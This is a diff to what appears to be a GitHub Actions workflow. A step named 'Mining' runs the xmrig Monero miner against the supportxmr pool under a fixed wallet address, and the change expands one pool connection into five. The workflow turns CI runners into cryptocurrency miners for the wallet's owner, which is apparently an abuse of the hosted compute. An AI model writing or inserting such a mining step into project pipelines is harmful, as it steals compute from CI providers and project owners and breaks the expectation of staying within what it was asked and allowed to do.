@@ -23,4 +23,9 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig --donate-level 5 -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 7 --randomx-mode=fast
+          ./xmrig --donate-level 5 --randomx-mode=fast \
+          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p x \
+          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 2 \
+          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 3 \
+          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 4 \
+          -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 5
